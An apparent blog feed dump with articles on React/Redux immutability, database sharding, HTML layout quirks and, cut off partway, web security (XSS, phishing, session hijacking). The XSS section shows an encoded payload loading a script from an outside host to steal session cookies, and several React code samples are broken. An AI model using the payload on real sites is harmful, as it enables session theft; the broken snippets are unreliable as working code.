&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;But functional languages prohibit mutations, and even if JavaSript allows them, if we want to abide by functional principles, we can write it like this instead:&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
function completeTask(task) {
  return {
    text: task.text,
    completed: true
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This not only encourages the use of function composition for calculating complicated things, but it also ensures that checking for equality is easy and fast. Since we are never mutating an existing object, checking for value equality reduces to instance equality checking.&lt;/p&gt;

&lt;p&gt;Because of how change notification works in React, immutability is also encouraged because it allows easy diffing of object trees because the comparison algorythm doesn’t have to go drill down recursively, it can simply stop when two fields name the same differ in instance.&lt;/p&gt;

&lt;p&gt;Quite often, beginner React developers write code like this:&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
updateTask = (id, newText, completed) =&amp;gt; {
  const tasks = this.state.tasks
  const existingTask = tasks.find(task =&amp;gt; task.id === id)
  
  if (task) {
    existingTask.text = newText
    existingTask.completed = lastName

    this.setState({
      tasks
    })
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We can do something else insted.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
updateTask = (id, text, completed) =&amp;gt; {
  const existingTask = this.state.tasks.find(person =&amp;gt; person.id === id)

  if (existingTask) {
    const existingTaskIndex = persons.indexOf(existingPerson)
    persons[] = firstName
    existingPerson.lastName = lastName
    
    this.setState({
      persons: [...state.persons, 
    })
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This ensures updating works.&lt;/p&gt;

&lt;p&gt;Redux is in a some ways similar to the concept of &lt;a href=&quot;https://reactjs.org/docs/lifting-state-up.html&quot;&gt;lifting state up&lt;/a&gt;, but instead of lifting it up to a parent component, we push it to a single shared store. Our fully-fledged todos reducer would look like this:&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
const ADD_TODO = 'ADD_TODO'
const TOGGLE_TODO = 'TOGGLE_TODO'
const CLEAR_TODOS = 'CLEAR_TODOS'

const todosReducer = (state = [], action) =&amp;gt; {
    case ADD_TODO: {
      return [
        ...state,
        {
          text: action.text,
          completed: false
        }
      ]
    }
    
    case TOGGLE_TODO: {
      return state.map(todo =&amp;gt; 
        todo.id ===  action.id 
          ? { ...todo, { completed: !todo.completed} } 
          : todo      
      })
    }

    case CLEAR_TODOS: {
      return []
    }
    
    default: {
      return state
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Instead of calling &lt;span class=&quot;code&quot;&gt;setState()&lt;/span&gt;, we dispatch an action which is received by a reducer which returns a new value for the application state based on the existing state and the action. Just like setState, a reducer typically leaves the existing fields untouched and just overrides what we want to change but the result is a new instance. In case we don’t want to change anything, we should return state instead of &lt;code class=&quot;code&quot;&gt;{ ...state }&lt;/code&gt;. Instance comparison still works.&lt;/p&gt;</content><author><name></name></author><summary type="html">Before getting into library-specific details, it’s worth starting with a definition of what constitutes reactivity. A typical example would be an Excel spreadsheet: if a cell aggregates data from other cells, that cell instantly changes if we change a value in any of the aggregated cells. In reactive programming, if a variable A depends on B and C, a change in either B or C would also trigger a change in A. While there seems to be an ongoing debate whether React is truly reactive, there’s no doubt that the UI reacts to changes in the data model, even if parts of the model itself don’t react to other parts being changed, so from now on, we’ll consider this definition of reactivity.</summary></entry><entry><title type="html">Scaling Out Relational Databases</title><link href="http://localhost:4000/scaling-sql" rel="alternate" type="text/html" title="Scaling Out Relational Databases" /><published>2020-02-25T08:39:37+02:00</published><updated>2020-02-25T08:39:37+02:00</updated><id>http://localhost:4000/scaling-sql</id><content type="html" xml:base="http://localhost:4000/scaling-sql">&lt;p&gt;Since a single database server can support a considerable load, it’s worth starting by saying that the need to scale out your database server means your business is doing several things right, so this is a good problem to have. While getting a machine with more processor cores, memory and disk space can alleviate your problems in the short term, at some point needing to distribute your database across multiple machines becomes unavoidable.&lt;/p&gt;

&lt;p&gt;Since a single database server can support a considerable load, it’s worth starting by saying that the need to scale out your database server means your business is doing several things right, so this is a good problem to have. While getting a machine with more processor cores, memory and disk space can alleviate your problems in the short term, at some point needing to distribute your database across multiple machines becomes unavoidable (before considering scaling out, however, consider the fact that most databases are &lt;strong&gt;read-heavy&lt;/strong&gt; meaning there are many more read operations than write operations and adding a caching layer can go a long way in improving performance – if this is not enough, secondary read replicas can be added to lessen the load in case of cache misses, but this also means there’s a small performance hit related to replication).&lt;/p&gt;

&lt;p&gt;There are several ways to set up database scale-out.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Vertical&lt;/strong&gt;. One approach to achieve scale-out is to have different tables from your schema reside on different machines. This is easy to implement in SQL Server because it is supported out of the box – distributed transactions across servers and hence referential integrity is also supported. This is also called &lt;em&gt;functional&lt;/em&gt; partitioning because avoiding distributed joins is usually recommended, which means the split will be done according to how tables are related to one another.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Horizontal&lt;/strong&gt;. Also called &lt;em&gt;sharding&lt;/em&gt;. With horizontal scale-out all nodes in the cluster have the same schema, but the table rows are being partitioned across the different nodes, which means a &lt;em&gt;partitioning strategy&lt;/em&gt; must be chosen for splitting the data. More on this later.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Mixed&lt;/strong&gt;. This strategy involves a combination of both previous approaches. In some cases our domain model is not easily shardable across a single dimension and it becomes convenient to use both vertical and horizontal partitioning.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Since fairly straight forward to implement vertical scale-out, this approach will very likely the first attempt at improving performance to be implemented, but more often than not it’s just a temporary solution because just like with scaling up there quickly comes a point of diminishing returns. It can however provide some temporary relief while implementing a sharding approach.&lt;/p&gt;

&lt;h2 id=&quot;sharding-strategies&quot;&gt;Sharding Strategies&lt;/h2&gt;
&lt;p&gt;Probably the most ubiquitous sharding strategy is to use a tenant key and one of the simplest sharding strategies is to have one database per user. That’s however not tenable if you have hundreds of thousands of users because it would mean one VM per user.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Range.&lt;/strong&gt; Sharding by range is probably the most simple way to implement horizontal partitioning and it means that each node in our cluster holds data associated with a certain range, for example data related to users. One drawback of that approach is that it doesn’t split data evenly.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Consistent hashing.&lt;/strong&gt; An approach that was developed to solve the problems associated with sharding by range is to use some form of hash as the key and there are several approaches to ensuring this repartition is uniform, hence the name &lt;em&gt;consistent&lt;/em&gt;. The problem with consistent caching is that while it does ensure you don’t have hotspots – the data might be spread evenly but &lt;em&gt;utilization&lt;/em&gt; (or reads) of that data isn’t. Consistent hashing also makes the rebalancing of shards quite difficult.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Using a keymap.&lt;/strong&gt; As the name suggests, this approach involves maintaining a list of keys-to-nodes mappings and it usually requires a different machine/database. Before querying data on a specific machine in the cluster, we first need to query the map, so this can add additional overhead.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We’ll mostly be looking at this approach from now on.&lt;/p&gt;

&lt;h2 id=&quot;a-real-world-example&quot;&gt;A Real World Example&lt;/h2&gt;
&lt;p&gt;Let’s imagine we’re building a social media application where users can create posts on their profile and comment on other users’ posts. The most natural strategy for splitting our data would be to do it by how that particular data is related to a user. The database would look similar to this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/scaling-sql/diag1.png&quot; alt=&quot;diagram1&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can immediately see that we have a small predicament – a comment is tied to both a post of a certain user &lt;em&gt;and&lt;/em&gt; to the user making the comment. So how would we go about partitioning? While we can store the comments in each user’s shard, that’s a really bad way to do it because displaying comments on a single post involves querying multiple shards, so it is much better to tie the comment to the post and in turn to the user to which the post belongs to.&lt;/p&gt;

&lt;p&gt;So what happens if we want to create something like a &lt;em&gt;history&lt;/em&gt; page, a central log of the user’s actions which contains all the comments a user posted or the friends he or she added in chronological order? We could of course query all the shards and get that info, but if you’re a company like Facebook (and have millions of users) that’s not feasible. The alternative is to duplicate information in something like a &lt;em&gt;History&lt;/em&gt; table, so every time a user posts a comment we also add an entry there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/scaling-sql/diag2.png&quot; alt=&quot;diagram2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Almost always sharding means we need to denormalize our data structure, so we’ll unavoidably have some data duplication.&lt;/p&gt;

&lt;p&gt;A typical case of duplication is catalog data (reference tables) which needs to be replicated across nodes. As an example, when users create their account, they can select a residence country and we would like to enforce referential integrity in the database via an FK constraint to a table containing a list of countries and if we want to avoid multi shard queries, this catalog must be on every node. Which means extra complexity.&lt;/p&gt;

&lt;h2 id=&quot;multi-shard-queries&quot;&gt;Multi Shard Queries&lt;/h2&gt;
&lt;p&gt;Regardless of how you’re structuring your data, there’s probably no escaping multi shard queries. To explain why here’s what a typical feed from &lt;a href=&quot;&quot;&gt;500px&lt;/a&gt; looks like:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/scaling-sql/feed.jpg&quot; alt=&quot;diagram2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While we can show a user’s timeline by querying just one shard, we can’t do that for feeds, because individual users are most likely following a multitude of users residing on multiple shards. Social media sites implement a system called infinite scrolling whereas the user scrolls the page down, more content is loaded with multiple shards being hit.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;With applications like Facebook, users mostly tend to follow other people from their own country/city, so we can try grouping users based on location.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;An asynchronous job could update a feed table with post ids for each user. This is not instantaneous which is why if you’re using Facebook you might have noticed that there’s a delay between posting something and the post showing up in other people’s feeds. Also not all posts show up in your feed, only a small portion of them. This is both to make your feed more easily consumable and to save up resources.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Requests across shards can be batched.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What happens if the data for one user is too big for one node? In that case, our sharding key would be a combination of the &lt;em&gt;user-id&lt;/em&gt; and the &lt;em&gt;post-id&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;using-a-mixed-approach&quot;&gt;Using A Mixed Approach&lt;/h2&gt;
&lt;p&gt;So far, projecting our data across the user dimension worked just fine, but what if we have a more complex system where this isn’t as straightforward? Let’s say we introduce one additional complication, that of social &lt;em&gt;groups&lt;/em&gt; where users can post.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/scaling-sql/diag3.png&quot; alt=&quot;diagram3&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For groups, sharding by user id isn’t the optimal approach because again it would mean we would have to query multiple shards to display the messages in a group conversation. But since the group functionality tends to be somewhat isolated from the rest of the application, this lends itself well to a mixed or functional scale-out approach where the related tables can reside on their node(s). If we also need to implement sharding, we can do it independently along the &lt;em&gt;group_id&lt;/em&gt; dimension.&lt;/p&gt;

&lt;p&gt;The functional scale-out approach also works well in conjunction with microservices and DDD bounded contexts, but that’s a fairly extensive subject and something for another article.&lt;/p&gt;</content><author><name></name></author><summary type="html">Since a single database server can support a considerable load, it’s worth starting by saying that the need to scale out your database server means your business is doing several things right, so this is a good problem to have. While getting a machine with more processor cores, memory and disk space can alleviate your problems in the short term, at some point needing to distribute your database across multiple machines becomes unavoidable.</summary></entry><entry><title type="html">HTML Layout: The Weird Parts</title><link href="http://localhost:4000/html-weird-parts" rel="alternate" type="text/html" title="HTML Layout: The Weird Parts" /><published>2019-09-15T06:39:37+03:00</published><updated>2019-09-15T06:39:37+03:00</updated><id>http://localhost:4000/html-weird-parts</id><content type="html" xml:base="http://localhost:4000/html-weird-parts">&lt;p&gt;If you have worked with another layout engine other than HTML, you probably think that HTML is hacky and unpredictable. And you wouldn’t be mistaken to think that: sometimes things expand to fill the available spaces, sometimes they don’t. Sometimes you specify a margin and it is respected. Sometimes it’s not. Most developers would feel your pain, but here’s the thing:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;HTML evolved over time, and sometimes a bit chaotically. It wasn’t thought out from the start in its current form.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Yet as web developers, we need to use it so we still need to understand its quirks. And first and foremost we need to understand the fundamental philosophy of HTML: it designed to describe pages that flow vertically, as opposed to say something like PDF documents which don’t flow AT ALL (they have &lt;strong&gt;fixed layout&lt;/strong&gt;). Mobile applications are also not really designed to flow so a lot of the UI elements like labels and buttons have fixed positions, while desktop applications (both Windows and macOS) are somewhere in between because you can resize the application window. Keep this in mind: &lt;em&gt;the browser usually assumes you read the content on the webpage from top to bottom and you use the scroll bar to navigate&lt;/em&gt;. The Facebook wall would be a perfect example of this philosophy.&lt;/p&gt;

&lt;p&gt;A byproduct of this assumption is that divs expand to fill the whole available space horizontally but not vertically. As a web developer, you are also expected to take into account the possibility the user might change the zoom factor of the page (to increase font-size), so it’s important that the application is responsive. Not to mention he or she might view the webpage from a mobile device.&lt;/p&gt;

&lt;p&gt;Before we explain the more quirky aspects of HTML, we need to have a basic overview of the box layout of the elements:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weird-html/css-box-model.png&quot; alt=&quot;css-box-model&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So an element will have&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Some content&lt;/li&gt;
  &lt;li&gt;A border which can have some thickness to it&lt;/li&gt;
  &lt;li&gt;Some padding between the border  and the actual content&lt;/li&gt;
  &lt;li&gt;A margin which indicates the space between the border and the neighboring elements&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Keep in mind that by default the &lt;em&gt;width&lt;/em&gt; and &lt;em&gt;height&lt;/em&gt; CSS properties refer to the size of the content and they DON’T include padding and margin size, which is a bit counterintuitive.&lt;/p&gt;

&lt;p&gt;Here’s what you need to do:&lt;/p&gt;

&lt;pre class=&quot;margin-bottom&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;.box-sized-element {
  box-sizing: border-box;    
}
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- &lt;script src=&quot;https://gist.github.com/toaderflorin/12fcda543d0c76cd57df3890917cfdd8.js&quot;&gt;&lt;/script&gt; --&gt;

&lt;p&gt;The default value is &lt;em&gt;content-box&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;margin-collapse&quot;&gt;Margin Collapse&lt;/h2&gt;
&lt;p&gt;A weird aspect of HTML (if you don’t know about it) is the way margins behave.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weird-html/collapse.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Margin collapsing means that if you have two elements with margins set on them, the space between them will equal the maximum of the two margins, NOT the sum. But this happens &lt;strong&gt;only vertically&lt;/strong&gt;. This again has to do with the vertical flow philosophy of HTML.&lt;/p&gt;

&lt;p&gt;But there’s another catch: margin collapsing doesn’t happen for the first or last element of a &lt;em&gt;block formatting context&lt;/em&gt;. But before we talk about those, let’s talk about…&lt;/p&gt;

&lt;h2 id=&quot;float-and-clear&quot;&gt;Float And Clear&lt;/h2&gt;
&lt;div style=&quot;background-color: #f8f8f8; padding: 15px;&quot;&gt;
  &lt;div style=&quot;display: block; width: 64px; height: 64px; background-color: cyan; float: left; margin-right: 12px;&quot;&gt;&lt;/div&gt;
  &lt;div style=&quot;display: block; width: 64px; height: 64px; background-color: red; float: left; margin-right: 12px;&quot;&gt;&lt;/div&gt;
  &lt;div style=&quot;display: block; width: 64px; height: 64px; background-color: magenta; float: right; margin-left: 12px;&quot;&gt;&lt;/div&gt;
  &lt;div style=&quot;display: block; width: 64px; height: 64px; background-color: yellow; float:left; clear: left; margin-right: 12px; margin-top: 12px&quot;&gt;&lt;/div&gt;
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam ultricies, dolor lacinia varius bibendum, augue ante tempor quam, nec faucibus tortor ligula non nisl. Suspendisse nec odio at orci dignissim ultrices. Morbi ac turpis ac tortor luctus euismod ut eget ante. Curabitur egestas luctus tortor, vitae fermentum est vestibulum id. Fusce imperdiet velit quis ornare hendrerit. Interdum et malesuada fames ac ante ipsum primis in faucibus. Aliquam dapibus massa et magna egestas, sit amet vehicula turpis lacinia. Ut tristique elit purus, et ultricies lorem volutpat vitae. Phasellus pellentesque imperdiet sapien id pretium. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The CSS for these elements looks like this:&lt;/p&gt;
&lt;pre class=&quot;margin-bottom&quot;&gt;&lt;code class=&quot;language-css line-numbers&quot;&gt;.cyan {
  width: 64px; 
  height: 64px; 
  background-color: cyan; 
  float: left;
}

.red {
  width: 64px; 
  height: 64px; 
  background-color: red; 
  float: left;
}

.magenta {
  width: 64px; 
  height: 64px; 
  background-color: magenta; 
  float: right;
}

.yellow {
  width: 64px; 
  height: 64px; 
  background-color: yeallow; 
  float: left;
  clear: left;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Floats are a standard way of incorporating an image (or some sort of container block) into a paragraph of text. Not only can you have multiple images, but you can actually use both &lt;em&gt;float&lt;/em&gt; and &lt;em&gt;clear&lt;/em&gt; at the same time.&lt;/p&gt;

&lt;p&gt;Keep in mind that floating elements don’t have any effect on the size of the container:&lt;/p&gt;

&lt;div style=&quot;background-color: #f8f8f8; padding: 15px;&quot;&gt;
  &lt;div style=&quot;display: block; width: 128px; height: 128px; background-color: salmon; float: left; margin-right: 12px;&quot;&gt;&lt;/div&gt;  
  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam ultricies, dolor lacinia varius bibendum, augue ante tempor quam, nec faucibus tortor ligula non nisl. Suspendisse nec odio at orci dignissim ultrices. Morbi ac turpis ac tortor luctus euismod ut eget ante.
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;This might not actually be the desired outcome, but it turns out there is a workaround.&lt;/p&gt;

&lt;div style=&quot;background-color: #f8f8f8; padding: 15px;&quot;&gt;
  &lt;div style=&quot;display: block; width: 128px; height: 128px; background-color: orange; float: left; margin-right: 12px;&quot;&gt;&lt;/div&gt;  
  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam ultricies, dolor lacinia varius bibendum, augue ante tempor quam, nec faucibus tortor ligula non nisl. Suspendisse nec odio at orci dignissim ultrices. Morbi ac turpis ac tortor luctus euismod ut eget ante.
  &lt;div style=&quot;clear: both;&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
What I did was add an empty div at the end of the parent container, like so:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;#x3C;div class=&amp;#x22;container&amp;#x22;&amp;#x3E;
  ...
  &amp;#x3C;div style=&amp;#x22;clear: both;&amp;#x22;&amp;#x3E;&amp;#x3C;/div&amp;#x3E;
&amp;#x3C;/div&amp;#x3E;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That’s a bit annoying so what you could do is create a CSS class that always appends an html element that does the clearing (like we previously did). This trick is called a &lt;strong&gt;clearfix&lt;/strong&gt;.&lt;/p&gt;

&lt;pre class=&quot;margin-bottom&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;.clearfix:after {
  content: &quot;&quot;;
  display: table;
  clear: both;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- &lt;script src=&quot;https://gist.github.com/toaderflorin/3605269010a8e7d506cf932afd496917.js&quot;&gt;&lt;/script&gt; --&gt;

&lt;p&gt;Then, all you need to do is simply add that class to all the elements that you want clearfixed.&lt;/p&gt;

&lt;h2 id=&quot;block-formatting-contexts&quot;&gt;Block Formatting Contexts&lt;/h2&gt;
&lt;p&gt;An element generates a block formatting context if it is:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;the root element or something that contains it&lt;/li&gt;
  &lt;li&gt;floats (elements where float is not ‘none’)&lt;/li&gt;
  &lt;li&gt;absolutely positioned elements (elements where position is absolute or fixed)&lt;/li&gt;
  &lt;li&gt;an inline-block (elements with display: inline-block)&lt;/li&gt;
  &lt;li&gt;a table cell (elements with display: table-cell, which is the default for HTML table cells)&lt;/li&gt;
  &lt;li&gt;a table caption (elements with display: table-caption, which is the default for HTML table captions)&lt;/li&gt;
  &lt;li&gt;a block element where overflow has a value other than visible&lt;/li&gt;
  &lt;li&gt;an element with display: flow-root&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When dealing with blocks, it’s important to know how they affect their children. One such effect is the margin collapsing. Another effect is that block size affects the size of its children. By default, a div will expand to fill its parent container vertically, but there’s a gotcha:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weird-html/width-auto.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This by default makes just the content to be 100%.&lt;/p&gt;

&lt;h2 id=&quot;vertical-centering&quot;&gt;Vertical Centering&lt;/h2&gt;
&lt;p&gt;Something as simple as centering something in the middle of a container was problematic before the addition of flexbox. It still is for older browsers that don’t fully support the &lt;em&gt;display: flex&lt;/em&gt; CSS specification. Before we get into the quirky cases, let’s see how we solve vertical centering with flexbox:&lt;/p&gt;

&lt;pre class=&quot;margin-bottom&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;.centered {
  display: flex;
  justify-content: center;
  align-items: center;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you know the height of the panel you want to center you can do something like:&lt;/p&gt;

&lt;pre class=&quot;margin-bottom&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;.centered-fixed {
  margin-top: calc(100% - 100px);
  margin-left: auto;
  margin-right: auto;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If your browser doesn’t support &lt;em&gt;calc&lt;/em&gt;, there are other ways to do it such as using line-height (which works only for text) or using &lt;em&gt;display: table-cell&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Yes, HTML behaves quite unexpectedly if you are coming from something like WPF. As long as you are aware of some of the gotchas of the spec and the differences between browser implementations, developing in it is quite pleasurable.&lt;/p&gt;</content><author><name></name></author><summary type="html">If you have worked with another layout engine other than HTML, you probably think that HTML is hacky and unpredictable. And you wouldn’t be mistaken to think that: sometimes things expand to fill the available spaces, sometimes they don’t. Sometimes you specify a margin and it is respected. Sometimes it’s not. Most developers would feel your pain, but here’s the thing:</summary></entry><entry><title type="html">Understanding Web Application Security</title><link href="http://localhost:4000/web-security" rel="alternate" type="text/html" title="Understanding Web Application Security" /><published>2019-07-28T09:39:37+03:00</published><updated>2019-07-28T09:39:37+03:00</updated><id>http://localhost:4000/web-security</id><content type="html" xml:base="http://localhost:4000/web-security">&lt;p&gt;I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/security/my-password.jpg&quot; alt=&quot;my-password&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This sort of thing happens more than you would imagine—what a lot of people don’t know is that hackers rely a lot on &lt;em&gt;social engineering&lt;/em&gt; to gain access to systems. &lt;a href=&quot;https://en.wikipedia.org/wiki/Kevin_Mitnick&quot;&gt;Kevin Mitnick&lt;/a&gt; was famous for calling in, pretending to be somebody he wasn’t and asking for somebody’s password to “perform some maintenance”.&lt;/p&gt;

&lt;h2 id=&quot;phishing&quot;&gt;Phishing&lt;/h2&gt;
&lt;p&gt;If you’ve followed the US 2016 election cycle news, you might have heard that John Podesta, Hillary Clinton’s campaign manager, was hacked. He was actually the victim of a &lt;em&gt;phishing&lt;/em&gt; scam, whereby he received an email, made to look like an authentic email from Google (he was using Gmail) that informed him that he needed to change his password because unauthorized access to his account was detected. He fell for it, clicked on the link which redirected him to a page that looked like a Google page (he didn’t pay attention to the URL, it seems), where he entered his old and &lt;em&gt;supposedly&lt;/em&gt; new credentials.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;But this is a scam, it’s not what I wanted to talk about, because you as a developer cannot do anything about it. I want to talk about real  vulnerabilities in the software and how they can be addressed, which means understanding the vectors attackers have at their disposal.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;There are quite a lot of developers that when it comes to web application security they rely on whatever framework they are using to take care of that for them, but don’t have an understanding of what’s happening behind the scenes. Web application security is quite a complex topic, we will be covering:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cross-site scripting, also called XSS&lt;/li&gt;
  &lt;li&gt;Session hijacking&lt;/li&gt;
  &lt;li&gt;Cross-site request forgery, or CSRF&lt;/li&gt;
  &lt;li&gt;SQL injection&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Both XSS and SQL Injection are cases of &lt;em&gt;code injection&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;cross-site-scripting&quot;&gt;Cross-Site Scripting&lt;/h2&gt;
&lt;p&gt;XSS refers to a vulnerability where an attacker can “inject” Javascript code that will be run by the application. In my previous article, I’ve discussed the &lt;a href=&quot;http://eksia.io/cors-made-simple&quot;&gt;same-origin&lt;/a&gt; policy concept at length which states that if the content from one site is granted permission to access resources on a system, then any content from that site will share these permissions, while content from another site will have to be granted permissions separately.&lt;/p&gt;

&lt;p&gt;&lt;i&gt;A lot of people think that SOP prevents XSS attacks. This is &lt;b&gt;not the case.&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;A typical example of XSS is &lt;em&gt;persistent cross-site scripting&lt;/em&gt;. If a page isn’t properly &lt;em&gt;sanitizing&lt;/em&gt; the user input (a field in a for, for example), a user could type invalid Javascript code, which is going to be saved by the application in its database and be subsequently rendered every time it displays a page. Imagine you have a page that is visible to multiple users (such as a product page) which allows users to add comments. If the page is not escaping user input, a malicious user can write actual a script block, which will then be rendered to all users as part of the page HTML. The Javascript code has access to the cookies of that user and it can send that information to the attacker.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/security/attack.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;An alternative is the &lt;em&gt;reflected&lt;/em&gt; (or non-persistent) XSS attack, whereby the user’s input is not stored in the database but returned in the same way it was inputted. It works like this: Say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.&lt;/p&gt;

&lt;pre&gt;
GET http://www.onlineshop.com?search=something
&lt;/pre&gt;

&lt;p&gt;If the site finds something, it returns a list of results, but if it doesn’t, it’s going to say&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Your search, ‘something’, returned no results.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;…which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term in the query string, contains some nefarious script block. If the user clicks on the link (which is likely because most people don’t hover on links to see where they lead to), the application server won’t be able to find any result and will return with a &lt;em&gt;not found&lt;/em&gt; page containing the script rendered directly on the page.&lt;/p&gt;

&lt;pre&gt;
GET http://www.onlineshop.com?
  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
  HTTP/1.1
&lt;/pre&gt;

&lt;p&gt;This script can then hijack the session cookie, like in the previous example.&lt;/p&gt;

&lt;p&gt;What can we do about it? Two things:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Validate inputs: this means checking that the user didn’t try to input any funky stuff and warning him if this is the case.&lt;/li&gt;
  &lt;li&gt;Sanitize outputs: everything that’s rendered to the page must be HTML escaped. This means that script blocks will be displayed as text, and won’t be part of the DOM, and thus executed.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If you are developing with Node / Express, there are plenty of packages to help you safeguard against XSS attacks, such as &lt;a href=&quot;https://www.npmjs.com/package/helmet&quot;&gt;helmet&lt;/a&gt; or &lt;a href=&quot;https://www.npmjs.com/package/xssfilter&quot;&gt;xssfilter&lt;/a&gt;, etc.&lt;/p&gt;

&lt;h2 id=&quot;session-hijacking&quot;&gt;Session Hijacking&lt;/h2&gt;
&lt;p&gt;Most web applications use a session mechanism that allows the server hosting the web application to know which user is making a specific request. Sessions usually involve authenticating the user, creating some sort of &lt;em&gt;session_id&lt;/em&gt; (usually a string) and setting a cookie with that value on the user’s browser. Session hijacking is a way of getting to know that string.&lt;/p&gt;

